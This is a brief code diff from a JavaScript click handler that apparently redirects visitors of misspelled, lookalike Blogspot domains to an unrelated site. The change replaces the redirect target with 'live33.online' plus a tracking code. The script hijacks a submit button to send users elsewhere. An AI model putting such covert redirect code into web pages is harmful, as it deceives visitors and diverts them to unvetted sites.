@@ -4,7 +4,7 @@ var button = document.querySelector('#submitButton');
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "dti2s.blogsot.com";
-        var redirectURL = "https://www.rolls3.com/";
+        var redirectURL = "https://live33.online/?03f5d38";
         var blockedDomains = [
             "dti2s.blspot.com",
             "dresstoimpres2.blogst.com/",
